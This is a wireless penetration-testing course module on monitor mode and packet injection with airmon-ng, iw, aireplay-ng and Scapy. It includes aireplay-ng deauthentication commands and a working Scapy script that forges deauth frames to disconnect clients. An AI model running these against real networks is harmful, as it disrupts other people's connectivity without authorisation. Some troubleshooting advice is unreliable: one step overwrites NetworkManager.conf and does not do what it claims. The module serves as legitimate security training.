# Module 02 — Monitor Mode & Packet Injection

> **Prerequisites:** [Module 01 — Linux Wireless Lab Setup](../module-01-linux-wireless-setup/)
> **Next Module:** [Module 03 — Wireless Reconnaissance](../module-03-reconnaissance/)

---

## Table of Contents

1. [What Is Monitor Mode?](#1-what-is-monitor-mode)
2. [Managed Mode vs. Monitor Mode vs. Master Mode](#2-managed-mode-vs-monitor-mode-vs-master-mode)
3. [The Linux Wireless Subsystem: cfg80211 & mac80211](#3-the-linux-wireless-subsystem-cfg80211--mac80211)
4. [Enabling Monitor Mode — Three Methods](#4-enabling-monitor-mode--three-methods)
5. [Channel Selection & Locking](#5-channel-selection--locking)
6. [Packet Injection — Theory & Mechanics](#6-packet-injection--theory--mechanics)
7. [The Radiotap Header](#7-the-radiotap-header)
8. [Testing Injection with aireplay-ng](#8-testing-injection-with-aireplay-ng)
9. [Scapy — Custom Frame Injection in Python](#9-scapy--custom-frame-injection-in-python)
10. [RFMON vs. Promiscuous Mode](#10-rfmon-vs-promiscuous-mode)
11. [Channel Hopping](#11-channel-hopping)
12. [Verifying Capture Quality](#12-verifying-capture-quality)
13. [Returning to Managed Mode](#13-returning-to-managed-mode)
14. [Advanced: Virtual Monitor Interfaces](#14-advanced-virtual-monitor-interfaces)
15. [Common Failures & Fixes](#15-common-failures--fixes)
16. [Knowledge Check](#16-knowledge-check)

---

## 1. What Is Monitor Mode?

In its default **managed mode**, a wireless NIC filters all incoming 802.11 frames at the hardware level. It only passes frames up the stack that are:
- Addressed to its own MAC (unicast)
- Broadcast (`FF:FF:FF:FF:FF:FF`)
- Multicast (specific group addresses)

Everything else is **silently discarded by the hardware**.

**Monitor mode** (RFMON — Radio Frequency MONitoring) bypasses this filter. The card passes **every single 802.11 frame it hears** up the stack, regardless of destination. This includes:

- Beacon frames from every AP in range
- Probe requests from every client (PNL leakage — Module 00)
- Authentication/Association frames
- Data frames (encrypted or cleartext)
- Control frames (ACKs, RTS, CTS)
- EAPOL frames (WPA2 4-way handshake — Module 06)
- Deauthentication frames (the deauth attack target — Module 08)
- Everything on the selected channel

Without monitor mode, none of the attacks in this course are possible.

---

## 2. Managed Mode vs. Monitor Mode vs. Master Mode

| Mode | Also Called | Purpose | Frame Filtering |
|------|------------|---------|-----------------|
| **Managed** | Infrastructure, Station | Normal client operation | Hardware-filtered: own MAC + broadcast only |
| **Monitor** | RFMON | Passive capture + injection | No filter — all frames passed |
| **Master** | AP mode | Act as an Access Point | Responds to client associations |
| **Ad-hoc** | IBSS | Peer-to-peer networking | Shared IBSS BSSID |
| **Mesh** | 802.11s | Mesh node | Mesh-specific routing |

```
   Managed Mode:                    Monitor Mode:

   AP ──frames──► NIC               AP ──all frames──► NIC
                   │                                    │
              [Hardware filter]                  [No filter]
                   │                                    │
          Only: to_my_MAC                      Every frame
          + broadcast                          on channel
                   │                                    │
               [Driver]                            [Driver]
                   │                                    │
         Normal TCP/IP stack              Raw 802.11 frames
                                          (with radiotap header)
```

---

## 3. The Linux Wireless Subsystem: cfg80211 & mac80211

Understanding this stack helps diagnose driver failures and explains why certain tools require specific kernel versions.

```
┌─────────────────────────────────────────────┐
│          Userspace Tools                    │
│  aircrack-ng, iw, hostapd, wpa_supplicant  │
└─────────────────┬───────────────────────────┘
                  │ netlink (nl80211)
                  │ nl80211 = modern netlink API replacing WEXT
┌─────────────────▼───────────────────────────┐
│              cfg80211                        │
│  Wireless configuration API (kernel space)  │
│  Handles: mode changes, scan results,       │
│  regulatory domain, power management        │
└─────────────────┬───────────────────────────┘
                  │
┌─────────────────▼───────────────────────────┐
│              mac80211                        │
│  Shared 802.11 protocol stack               │
│  Handles: frame aggregation, QoS,           │
│  rate control, fragment reassembly          │
│  Used by: ath9k, ath10k, iwlwifi, mt76...  │
└─────────────────┬───────────────────────────┘
         ┌────────┴────────────────────────┐
         │                                 │
┌────────▼──────────┐           ┌──────────▼──────────┐
│  mac80211 driver  │           │   Full-MAC / vendor  │
│  (ath9k_htc,      │           │   driver             │
│   mt76x2u...)     │           │   (RTL8812AU/88XXau) │
│  Uses mac80211    │           │   Bypasses mac80211  │
│  protocol stack   │           │   → direct cfg80211  │
└────────┬──────────┘           └──────────┬───────────┘
         └────────────┬───────────────────-┘
                      │
┌─────────────────────▼───────────────────────┐
│              Physical Hardware               │
│         (Wi-Fi chipset + antenna)            │
└─────────────────────────────────────────────┘
```

**Key insight:** RTL8812AU (and most USB adapters) use a **full-MAC/vendor driver** that bypasses `mac80211`. This is why:
- Some features (like frame aggregation) differ between chipsets
- Injection on RTL8812AU sometimes requires different flags than on ath9k
- Out-of-tree drivers like `88XXau` need manual compilation (covered in Module 01)

**`nl80211`** is the modern netlink-based API. When `airmon-ng` enables monitor mode, it issues `nl80211` commands via `libnl`. Tools like `iw` are thin wrappers around nl80211 syscalls.

---

## 4. Enabling Monitor Mode — Three Methods

### Method 1: airmon-ng (Recommended for Attack Workflows)

`airmon-ng` kills interfering processes, creates a monitor interface, and names it predictably.

```bash
# Step 1: Kill anything that might interfere
sudo airmon-ng check kill
# Kills: NetworkManager, wpa_supplicant, dhclient, dhcpcd

# Step 2: Enable monitor mode
sudo airmon-ng start wlan0

# Expected output:
# PHY     Interface   Driver          Chipset
# phy1    wlan0       88XXau          Realtek RTL8812AU
#         (monitor mode enabled; use wlan0mon)

# Optionally lock to a specific channel immediately:
sudo airmon-ng start wlan0 6
# → Enables monitor mode AND locks to channel 6 in one step

# Step 3: Verify
iwconfig wlan0mon
# Mode must say: Monitor

# Stop when done
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
```

**`airmon-ng start` flag reference:**
```
airmon-ng start <interface> [channel]

  start         Enable monitor mode
  <interface>   The wireless interface (e.g. wlan0, wlan1)
  [channel]     Optional: lock to channel immediately (1–14 for 2.4GHz, 36+ for 5GHz)
```

### Method 2: iw (Modern, Manual — Best for Scripting)

```bash
# Interface must be down before mode change
sudo ip link set wlan0 down

# Set monitor mode via nl80211/cfg80211
sudo iw dev wlan0 set type monitor

# Optional flags for injection compatibility:
# 'control' — pass control frames (ACKs, RTS, CTS) up to userspace
# 'other_bss' — receive frames from BSSes other than the current one
# 'cook' — receive cooked frames (less common)
sudo iw dev wlan0 set monitor control other_bss

# Bring interface back up
sudo ip link set wlan0 up

# Confirm
iw dev wlan0 info
# type: monitor  ← success

# Return to managed mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type managed
sudo ip link set wlan0 up
```

### Method 3: iwconfig (Legacy — Still Works)

```bash
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
iwconfig wlan0
# Mode:Monitor ← confirmed

# Return to managed mode
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode managed
sudo ifconfig wlan0 up
```

### Comparison Table

| Method | Auto kills processes | Renames interface | Best for |
|--------|---------------------|-------------------|----------|
| `airmon-ng start` | ✓ Yes | Yes (wlan0 → wlan0mon) | Most attack workflows |
| `iw set type monitor` | ✗ No | No | Scripting, precise control |
| `iwconfig mode monitor` | ✗ No | No | Legacy compatibility |

---

## 5. Channel Selection & Locking

When in monitor mode, your adapter must be on the **same channel as your target** to capture its traffic.

### Finding the Target Channel

```bash
# Quick scan — airodump-ng hops channels automatically
sudo airodump-ng wlan0mon

# The CH column shows each AP's channel:
# BSSID              PWR  Beacons  #Data  CH  MB   ENC  CIPHER AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -45      124      0   6  130  WPA2 CCMP   PSK  TargetNet
#                                          ^
#                                          Channel 6 — lock here before attacking
```

### Locking to a Specific Channel

```bash
# Method 1: During airmon-ng start (cleanest)
sudo airmon-ng start wlan0 6

# Method 2: After monitor mode is already enabled
sudo iw dev wlan0mon set channel 6

# Method 3: With specific channel width (802.11n HT40+)
sudo iw dev wlan0mon set channel 6 HT40+
# HT40+  → primary channel 6, extension channel above (channel 10)
# HT40-  → primary channel 6, extension channel below (channel 2)
# Note: both AP and your adapter must support HT40 for this to work

# 5GHz channel examples
sudo iw dev wlan0mon set channel 36           # 5180 MHz, 20 MHz width
sudo iw dev wlan0mon set channel 36 HT40+    # 5180 MHz, 40 MHz (UNII-1)
sudo iw dev wlan0mon set channel 36 80MHz    # 5180 MHz, 80 MHz (VHT, 802.11ac)

# Legacy iwconfig method
sudo iwconfig wlan0mon channel 6
```

### Verifying Current Channel

```bash
iw dev wlan0mon info
# channel 6 (2437 MHz), width: 20 MHz ← confirmed

iwconfig wlan0mon | grep Frequency
# Frequency:2.437 GHz  ← channel 6
```

### 2.4 GHz Channel Reference

```
Channel  Frequency   Non-Overlapping (NA)
  1      2412 MHz    ← Yes
  2      2417 MHz
  3      2422 MHz
  4      2427 MHz
  5      2432 MHz
  6      2437 MHz    ← Yes
  7      2442 MHz
  8      2447 MHz
  9      2452 MHz
 10      2457 MHz
 11      2462 MHz    ← Yes
 12      2467 MHz    (Europe only)
 13      2472 MHz    (Europe only)
 14      2484 MHz    (Japan only, 802.11b)
```

### 5 GHz Channel Reference

```
UNII-1 (Indoor):   36, 40, 44, 48           (no DFS)
UNII-2 (DFS):      52, 56, 60, 64           (radar detection required)
UNII-2e (DFS):     100–140                  (radar detection required)
UNII-3 (Outdoor):  149, 153, 157, 161, 165  (no DFS — best for injection)
```

**DFS channels:** Your adapter may refuse to inject or even transmit on DFS channels due to regulatory enforcement. Use UNII-1 or UNII-3 for reliable injection.

---

## 6. Packet Injection — Theory & Mechanics

Packet injection is the ability to **transmit arbitrary, crafted 802.11 frames** without going through the normal association state machine.

### Why Injection Is Possible

A NIC in monitor mode can transmit frames with:
- Any source MAC address (Address 2) — **freely spoofed**
- Any destination MAC address (Address 1)
- Any BSSID (Address 3)
- Any frame type/subtype (Management, Control, Data)
- FCS automatically recalculated by the driver

This is how `aireplay-ng` forges deauthentication frames from an AP it has never authenticated with.

### How the Kernel Passes Injected Frames

```
User tool (aireplay-ng / scapy)
    │
    │ Constructs raw 802.11 frame
    │ Prepends radiotap header (rate, channel, TX flags)
    │
    ▼
Raw socket (AF_PACKET / PF_PACKET, ETH_P_ALL)
    │
    ▼
Driver TX path
    │
    ├─ Driver validates radiotap header
    ├─ Recalculates FCS (CRC-32 over entire frame)
    ├─ Adds PHY preamble (PLCP header)
    │
    ▼
RF transmission (CSMA/CA competes for channel)
```

### `aireplay-ng --ignore-negative-one`

On heavily loaded channels, `aireplay-ng` sometimes reports "Fixed channel wlan0mon: -1" and refuses to inject. This means the interface channel and the target channel don't match:

```bash
# Force injection to ignore the channel mismatch warning
sudo aireplay-ng --ignore-negative-one -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
#                ^^^^^^^^^^^^^^^^^^^^^
#                Ignore "Fixed channel -1" error
```

---

## 7. The Radiotap Header

When injecting frames, tools prepend a **radiotap header** — a standardized metadata structure that instructs the driver about transmission parameters.

### Radiotap Header Structure

```
Radiotap Header (variable length, precedes every 802.11 frame in monitor captures)
├── it_version:    0 (always 0)
├── it_pad:        0 (padding)
├── it_len:        total length of radiotap header in bytes
├── it_present:    bitmask of which fields follow
│
├── Rate:          TX data rate in 0.5 Mbps units
│                  2  = 1 Mbps (most compatible, used for injection)
│                  12 = 6 Mbps
│                  108 = 54 Mbps
│
├── Channel:       Frequency in MHz + channel flags
│                  2437 = 2.4 GHz channel 6
│                  Flags: OFDM, CCK, 5GHz, 2GHz, passive, DFS...
│
├── TX Flags:      Controls injection behavior
│                  0x0008 = Don't wait for ACK (used in deauth flood)
│                  0x0010 = Send RTS/CTS before frame
│
├── MCS Info:      For 802.11n HT rates (MCS 0–31)
│
└── Antenna:       Which antenna to use (0 = auto)
```

### Radiotap in aireplay-ng

`aireplay-ng` constructs the radiotap header automatically. By default it uses 1 Mbps rate for maximum compatibility across all 802.11 standards. You can influence this:

```bash
# Force specific TX rate (in Mbps)
# aireplay-ng uses --rate flag in some versions
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF --rate 1 wlan0mon
```

### Reading Radiotap in Wireshark

In Wireshark, expand any captured frame: `IEEE 802.11 radio information → `. You will see:
- Data rate (e.g., 1.0 Mb/s for injected frames)
- Channel (e.g., 2437 MHz [BG 6])
- Signal strength (dBm antenna signal)
- Noise level

---

## 8. Testing Injection with aireplay-ng

Always test injection before attempting any attack. A failed test means no attack will work.

### Basic Injection Test

```bash
sudo aireplay-ng --test wlan0mon
# Shorthand: sudo aireplay-ng -9 wlan0mon

# Flag breakdown:
# -9 / --test    Run the injection capability test
# wlan0mon       The monitor mode interface to test
```

**Successful output:**
```
12:00:00  Trying broadcast probe requests...
12:00:00  Injection is working!
12:00:00  Found 5 APs

12:00:00  Trying directed probe requests...
12:00:00  AA:BB:CC:DD:EE:FF - channel: 6 - 'TargetNet'
12:00:01           30/30: 100%
12:00:01  BB:CC:DD:EE:FF:00 - channel: 11 - 'HomeNet'
12:00:02           28/30:  93%
```

**Failed output:**
```
12:00:00  Trying broadcast probe requests...
12:00:04  No answer...
12:00:04  Found 0 APs

Injection appears to be broken.
```

### Directed Injection Test (Against Specific AP)

```bash
sudo aireplay-ng --test -b AA:BB:CC:DD:EE:FF wlan0mon

# -b <BSSID>   Target a specific AP
# Reports per-AP injection success percentage
# < 80% = unreliable — investigate driver, channel, distance, TX power
```

### Debugging Injection Failures — Step by Step

```bash
# Step 1: Confirm correct channel
sudo iw dev wlan0mon set channel 6
sudo aireplay-ng -9 wlan0mon

# Step 2: Check TX power
iwconfig wlan0mon | grep Tx-Power
sudo iw dev wlan0mon set txpower fixed 3000   # 30 dBm

# Step 3: Verify monitor mode
iwconfig wlan0mon | grep Mode
# Must say: Mode:Monitor

# Step 4: Add injection flags
sudo ip link set wlan0mon down
sudo iw dev wlan0mon set monitor control other_bss
sudo ip link set wlan0mon up
sudo aireplay-ng -9 wlan0mon

# Step 5: For channel mismatch errors
sudo aireplay-ng --ignore-negative-one -9 wlan0mon
```

---

## 9. Scapy — Custom Frame Injection in Python

For advanced scenarios — crafting non-standard frames, fuzzing, or automating multi-step attacks — use **Scapy**. It gives you full control over every field in the 802.11 frame.

```python
#!/usr/bin/env python3
# custom-inject.py — Send a crafted Probe Request using Scapy
# Run as root: sudo python3 custom-inject.py

from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11ProbeReq, Dot11Elt, RadioTap

# Define the interface in monitor mode
IFACE = "wlan0mon"

# Build a Probe Request frame
frame = (
    RadioTap() /                       # Radiotap header (auto-filled by Scapy)
    Dot11(
        type=0,                        # 0 = Management frame
        subtype=4,                     # 4 = Probe Request
        addr1="ff:ff:ff:ff:ff:ff",    # Destination: broadcast
        addr2="AA:BB:CC:DD:EE:FF",    # Source: our (spoofed) MAC
        addr3="ff:ff:ff:ff:ff:ff"     # BSSID: broadcast
    ) /
    Dot11ProbeReq() /
    Dot11Elt(ID="SSID", info="TargetSSID") /    # SSID element
    Dot11Elt(ID="Rates", info="\x82\x84\x8b\x96\x0c\x12\x18\x24")  # Supported rates
)

print(f"[*] Sending Probe Request for 'TargetSSID' on {IFACE}")
sendp(frame, iface=IFACE, count=5, inter=0.1, verbose=True)
print("[+] Done")
```

**Crafting a Deauthentication frame with Scapy:**

```python
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

IFACE = "wlan0mon"
AP_MAC = "AA:BB:CC:DD:EE:FF"     # Target AP BSSID
CLIENT_MAC = "11:22:33:44:55:66" # Target client (or ff:ff:ff:ff:ff:ff for broadcast)

deauth = (
    RadioTap() /
    Dot11(
        type=0,      # Management
        subtype=12,  # Deauthentication
        addr1=CLIENT_MAC,   # Receiver (victim client)
        addr2=AP_MAC,       # Transmitter (spoofed as AP)
        addr3=AP_MAC        # BSSID (AP)
    ) /
    Dot11Deauth(reason=7)   # Reason 7 = Class 3 frame received from nonassociated STA
)

print(f"[*] Sending deauth to {CLIENT_MAC} from spoofed AP {AP_MAC}")
sendp(deauth, iface=IFACE, count=10, inter=0.1, verbose=True)
```

**Common Dot11Deauth reason codes:**
| Code | Meaning |
|------|---------|
| 1 | Unspecified reason |
| 2 | Previous auth no longer valid |
| 3 | Deauth because STA is leaving |
| 7 | Class 3 frame from nonassociated STA |

---

## 10. RFMON vs. Promiscuous Mode

| Feature | Monitor Mode (RFMON) | Promiscuous Mode |
|---------|---------------------|-----------------|
| **Layer** | PHY + MAC (Layer 1+2) | MAC (Layer 2 only) |
| **Captures** | All 802.11 frames incl. management/control | Only data frames on your associated network |
| **Requires association** | No — completely passive | Yes |
| **Frame format** | Raw 802.11 + radiotap header | Ethernet (802.3) |
| **Packet injection** | Yes | No |
| **Sees Beacons** | Yes | No |
| **Sees EAPOL** | Yes (from any session) | Only your own |
| **Use case** | All wireless attacks in this course | Post-association local network sniffing |
| **Tool example** | `tcpdump -i wlan0mon` | `tcpdump -i eth0 -p` |

**Critical:** Enabling promiscuous mode on a wireless adapter in managed mode does **not** give you monitor mode. You must use RFMON for any attack in this course.

---

## 11. Channel Hopping

When performing reconnaissance (Module 03), you want to see APs on all channels simultaneously — this is **channel hopping**.

### Default Behavior (airodump-ng)

```bash
# Without locking, airodump-ng hops every ~0.25 seconds automatically
sudo airodump-ng wlan0mon
# Cycles: 1→2→3→4→5→6→7→8→9→10→11 (2.4 GHz default)
# CH column in output shows current channel being monitored

# Hop both bands (requires dual-band adapter)
sudo airodump-ng --band abg wlan0mon
# a = 5 GHz, b/g = 2.4 GHz
```

### Manual Channel Hopping Script

```bash
#!/bin/bash
# channel-hop.sh — Custom channel hopper
# Usage: sudo ./channel-hop.sh wlan0mon

IFACE=${1:-wlan0mon}
CHANNELS=(1 6 11 36 40 44 48 149 153 157 161)  # Non-overlapping only
DWELL=0.3  # seconds per channel

echo "[*] Channel hopping on $IFACE"
while true; do
  for CH in "${CHANNELS[@]}"; do
    sudo iw dev "$IFACE" set channel "$CH" 2>/dev/null
    sleep "$DWELL"
  done
done
```

### The Recon vs. Attack Trade-off

| Mode | Coverage | Frame Capture |
|------|----------|---------------|
| Hopping | All channels — see everything | Miss frames during dwell on other channels |
| Locked | Target channel only — blind elsewhere | **Never miss a frame on target channel** |

**Rule:** Recon phase → hop. Attack phase → lock.

### kismet as a Channel-Hop-Free Alternative

`kismet` uses a different approach — it can spawn multiple capture sources and assign different channels to each, enabling true simultaneous multi-channel monitoring without missing frames:

```bash
# Start kismet with two interfaces on different channels
sudo kismet -c wlan0:channel=6 -c wlan1:channel=11

# kismet web UI available at http://localhost:2501
# Captures ALL frames from both channels simultaneously
# Unlike airodump-ng, does not need to hop between channels
```

---

## 12. Verifying Capture Quality

After enabling monitor mode, verify you're capturing useful frames before proceeding.

### Quick Verification with tcpdump

```bash
# Capture 10 frames, display frame type info
sudo tcpdump -i wlan0mon -c 10 -e 2>&1 | head -30

# What to look for:
# Management frames: Beacon, Probe Request/Response
# 12:00:01 AA:BB:CC > Broadcast, Probe Request (0) [1.0* 2.0* 5.5* Mbit]
# 12:00:01 DD:EE:FF > Broadcast, Beacon (8) [1.0* Mbit] SSID:"HomeNet"

# If you see Ethernet frames instead of 802.11 frames:
# → Adapter is NOT in monitor mode (still presenting as Ethernet interface)
```

### Using airodump-ng as a Quick Check

```bash
sudo airodump-ng wlan0mon

# Within 5–10 seconds you should see:
# - Beacons column climbing
# - Multiple SSIDs appearing
# - Signal strengths in PWR column (negative dBm values)

# Empty output after 30 seconds means:
# → Monitor mode not actually enabled
# → Wrong channel (nothing on this channel)
# → Driver issue (try reloading: sudo rmmod 88XXau && sudo modprobe 88XXau)
```

### Wireshark Verification

```bash
# Open Wireshark on the monitor interface
sudo wireshark -i wlan0mon -k

# Display filters for verification:
# wlan.fc.type == 0          → Management frames only
# wlan.fc.type_subtype == 8  → Beacons only
# eapol                      → 4-way handshake frames
# wlan.fc.type_subtype == 12 → Deauth frames only

# You should immediately see Beacon frames and Probe Requests
# If you see ARP/IP frames without 802.11 headers → not in monitor mode
```

### Frame Count Sanity Check

```bash
# Count frames per type in a capture file
tshark -r capture.cap -q -z io,stat,0,wlan.fc.type==0,wlan.fc.type==1,wlan.fc.type==2

# Output:
# Type 0 (Management): 1248 frames
# Type 1 (Control):    3821 frames
# Type 2 (Data):        891 frames
# → Healthy capture shows all three types
```

---

## 13. Returning to Managed Mode

Always clean up after your session.

### Using airmon-ng

```bash
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
```

### Manual Cleanup

```bash
sudo ip link set wlan0mon down
sudo iw dev wlan0mon set type managed
sudo ip link set wlan0mon up
# If airmon-ng renamed the interface (wlan0 → wlan0mon), rename it back:
sudo ip link set wlan0mon name wlan0
```

### Full Reset (Nuclear Option)

```bash
# Reload the driver entirely
sudo rmmod 88XXau       # for RTL8812AU
sudo modprobe 88XXau
# or for ath9k:
sudo rmmod ath9k_htc && sudo modprobe ath9k_htc
sudo systemctl restart NetworkManager
```

---

## 14. Advanced: Virtual Monitor Interfaces

You can create a second virtual interface in monitor mode while keeping the original in managed mode. Useful when you need both internet access and monitoring simultaneously.

```bash
# Create a virtual monitor interface on the same physical radio
sudo iw phy phy0 interface add wlan0mon type monitor

# Bring the virtual interface up
sudo ip link set wlan0mon up

# Verify both exist
iw dev
# phy#0
#   Interface wlan0      → type: managed  (still has internet)
#   Interface wlan0mon   → type: monitor  (capture/inject)

# Delete the virtual interface when done
sudo iw dev wlan0mon del
```

**Critical caveat:** Both interfaces share the same physical radio (`phy0`). The radio can only be on one frequency at a time. If `wlan0` is connected to a channel-6 AP, `wlan0mon` is also locked to channel 6. Independent channel control requires a second physical adapter.

---

## 15. Common Failures & Fixes

### Issue: `wlan0mon` disappears immediately after creation

```bash
# Cause: NetworkManager restarts and reclaims the interface
sudo systemctl stop NetworkManager
sudo airmon-ng start wlan0

# Permanent fix: prevent NM from managing USB adapters
echo -e '[device]\nwifi.scan-rand-mac-address=no' | \
  sudo tee /etc/NetworkManager/NetworkManager.conf
```

### Issue: Monitor mode shows no frames

```bash
# Check 1: Wrong channel
sudo iw dev wlan0mon set channel 6

# Check 2: TX power too low to receive
sudo iw dev wlan0mon set txpower fixed 3000

# Check 3: Force 2.4GHz if adapter drifted to 5GHz
sudo iw dev wlan0mon set freq 2412

# Check 4: Confirm adapter is actually in monitor mode
sudo tcpdump -i wlan0mon -c 3
# If you see Ethernet frames → NOT in monitor mode
```

### Issue: Injection works on some APs but not others

```bash
# Force 1 Mbps rate (maximum compatibility)
sudo iwconfig wlan0mon rate 1M
sudo aireplay-ng -9 -b AA:BB:CC:DD:EE:FF wlan0mon

# Use --ignore-negative-one for channel mismatch warnings
sudo aireplay-ng --ignore-negative-one -9 wlan0mon
```

### Issue: `Device or resource busy` when starting monitor mode

```bash
sudo fuser /dev/rfkill
sudo airmon-ng check kill
sudo lsof | grep wlan0
sudo kill -9 <PID>
sudo airmon-ng start wlan0
```

### Issue: Injected deauth frames visible in Wireshark but client doesn't disconnect

Possible causes:
1. **802.11w (PMF) is enabled** on the AP — deauth frames are authenticated; forged ones are rejected
2. **Wrong channel** — frames injected but AP can't receive them
3. **Rate too high** — try `sudo iwconfig wlan0mon rate 1M`
4. **BSSID mismatch** — double-check Address 2 matches the AP's MAC exactly

```bash
# Verify PMF status of target AP
sudo airodump-ng wlan0mon
# WPA3 networks always have PMF; WPA2 networks with PMF show it in capabilities

# Check with iw
sudo iw dev wlan0mon scan | grep -A 5 "TargetNet" | grep MFP
# MFP: yes → PMF enabled → deauth forge won't work
```

---

## 16. Knowledge Check

Before proceeding to Module 03:

1. Explain in precise technical terms what monitor mode does at the hardware level that managed mode does not.
2. What is the difference between `cfg80211` and `mac80211`? Which one does `iw` communicate with, and via what API?
3. Write the exact command sequence to enable monitor mode using `iw` (without airmon-ng), add `control` and `other_bss` flags, lock to channel 11, then return to managed mode.
4. What is a radiotap header? Name three fields it contains and explain what each controls.
5. Explain the difference between RFMON and promiscuous mode. Why doesn't promiscuous mode work for wireless attacks?
6. What does `aireplay-ng -9` actually transmit, and what does a 100% success rate confirm?
7. When should you channel-hop vs. lock to a specific channel? Name one scenario for each.
8. What does `--ignore-negative-one` do in `aireplay-ng` and when is it needed?
9. How do you create a virtual monitor interface while keeping the original in managed mode? What is the key limitation?
10. What does it mean when injected deauth frames appear in Wireshark but the target client does not disconnect? Name two possible causes.
11. Write a Scapy snippet to send a broadcast Probe Request for SSID "TestNet".
12. What does `iw dev wlan0 set monitor control other_bss` add that plain `set type monitor` does not?
13. What command verifies that capture is producing real 802.11 frames and not Ethernet frames?
14. Name two advantages `kismet` has over `airodump-ng` for multi-channel monitoring.

---

**Next:** [Module 03 — Wireless Reconnaissance with airodump-ng](../module-03-reconnaissance/)
